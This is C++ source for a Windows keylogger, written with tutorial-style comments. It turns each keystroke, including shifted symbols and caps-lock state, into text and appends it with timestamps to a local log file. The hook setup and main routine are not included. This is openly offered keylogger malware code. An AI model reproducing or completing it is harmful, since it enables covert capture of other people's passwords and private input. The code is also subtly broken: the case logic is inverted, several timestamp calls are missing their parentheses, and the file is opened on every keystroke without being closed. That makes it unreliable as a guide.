#include <windows.h>
#include <fstream>          // Opening, writing, and closing files 
#include <iostream>
#include <string>
#include <ctime>			// Get time and format
#include <iomanip>			// formatting functions

// global variables


// file stream object
std::ofstream logFile;

// store the ID of our keyboard hook
HHOOK keyboardHook;

// track first keystroke of session
bool isFirstKey = true;


// time helper
std::string getFormattedTime() {
	// time_t is a data type in <ctime> used to store system time values
	// we name it "now" and set it to equal to time() which is the systems current time, typically
	// measured as a number of seconds eslapsed since January 1, 1970
	time_t now = time(0);

	struct tm timeinfo;

	// _s just means secure. 
	localtime_s(&timeinfo, &now);

	// storing formatted array
	char buffer[20];

	strftime(buffer, sizeof(buffer), "[%H:%M:%S]", &timeinfo);

	// convert c style string to c++ string
	return std::string(buffer);
}

// Log keystroke
void logKey(int vkCode) {
	// open file
	// std::ios::app is just append, just makes sure the data isn't overwritten.
	logFile.open("keylogger.txt", std::ios::app);

	// Print a header when keylogger starts

	if (isFirstKey) {
		logFile << "\n" << std::string(60, '=') << "\n";
		logFile << "SESSION STARTED: " << getFormattedTime() << "\n";
		logFile << std::string(60, '=') << "\n\n";


		// Make sure to equal false when we call function as to not print to console repeatedly
		isFirstKey = false;
	}

	// Check modifiers like shift key, caps lock, etc.

	// Windows returns 0x8000 is key is being pressed and 0x0000 if not
	// & compares each bit, if both bits are one then the result is one, if otherwise its 0
	// 0x8000 = 1000 0000 00000 0000
	bool shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;

	// The difference between these two is Async key state is when its currently being pressed
	// and GetKeyState is a toggle, meaning if it was pressed once it stays pressed. 

	// 0 is false, 1 is true. 
	bool capsLockOn = GetKeyState(VK_CAPITAL) & 0x0001;

	// Convert VKC to readable characters

	// Special control keys
	// These keys dont produce visual characters but we still want to log like F7 or ctrl, spaces, back, tab, etc. 

	if (vkCode == VK_SPACE) {
		logFile << " ";
	}

	else if (vkCode == VK_RETURN) {
		logFile << "\n" << getFormattedTime() << "[ENTER]\n";
	}
	else if (vkCode == VK_BACK) {
		logFile << getFormattedTime << "[BACKSPACE] ";
	}
	else if (vkCode == VK_TAB) {
		logFile << getFormattedTime << "[TAB] ";
	}
	else if (vkCode == VK_ESCAPE) {
		logFile << getFormattedTime << "[ESC] ";
	}
	else if (vkCode == VK_DELETE) {
		logFile << getFormattedTime << "[DELETE] ";
	}


	// LETTER KEYS 
	// 0x41 through 0x5A are letters A-Z
	// 0x41 - 0x5A are by default uppercase
	else if (vkCode >= 0x41 && vkCode <= 0x5A) {
		// Checks to see if shift is pressed and caps lock off thus equaling capital letter
		// Checks to see if shift isnt pressed and caps lock is on thus equaling capital letter
		bool isUpperCase = (shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn);


		// Since our vkCode is by default uppercase, she just 
		if (!isUpperCase) {
			logFile << (char)vkCode;
		}
		// Lower case is exactly 32 more than its original key
		// so 41 is "A" add 32 in hex and its now "a"
		else {
			logFile << (char)(vkCode + 32);
		}
	}

	// NUmber keys
	// 0x30 - 0x39
	// 0-9
	else if (vkCode >= 0x30 && vkCode <= 0x39) {
		// Checking to see if shift is held as it won't be a number rather a special character like 1 would = !
		if (shiftPressed) {
			char shiftNumbers[] = { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(' };

			int index = vkCode - 0x30;
			logFile << shiftNumbers[index];
		}
		else {
			logFile << (char)vkCode;
		}
	}

	// punctuation and special characters
	else if (vkCode == 0xBA || vkCode == 186) {
		// Colon / SemiColon
		logFile << (shiftPressed ? ':' : ';');
	}
	else if (vkCode == 0xBB || vkCode == 187) {
		// Equals / Plus key
		logFile << (shiftPressed ? '+' : '=');
	}
	else if (vkCode == 0xBC || vkCode == 188) {
		// Comma / Less than key
		logFile << (shiftPressed ? '<' : ',');
	}
	else if (vkCode == 0xBD || vkCode == 189) {
		// Minus / Underscore key
		logFile << (shiftPressed ? '_' : '-');
	}
	else if (vkCode == 0xBE || vkCode == 190) {
		// Period / Greater than key
		logFile << (shiftPressed ? '>' : '.');
	}
	else if (vkCode == 0xBF || vkCode == 191) {
		// Forward slash / Question mark key
		logFile << (shiftPressed ? '?' : '/');
	}
	else if (vkCode == 0xC0 || vkCode == 192) {
		// Backtick / Tilde key
		logFile << (shiftPressed ? '~' : '`');
	}
	else if (vkCode == 0xDB || vkCode == 219) {
		// Left bracket key
		logFile << (shiftPressed ? '{' : '[');
	}
	else if (vkCode == 0xDC || vkCode == 220) {
		// Backslash / Pipe key
		logFile << (shiftPressed ? '|' : '\\');
	}
	else if (vkCode == 0xDD || vkCode == 221) {
		// Right bracket key
		logFile << (shiftPressed ? '}' : ']');
	}
	else if (vkCode == 0xDE || vkCode == 222) {
		// Quote key
		logFile << (shiftPressed ? '"' : '\'');
	}



 }


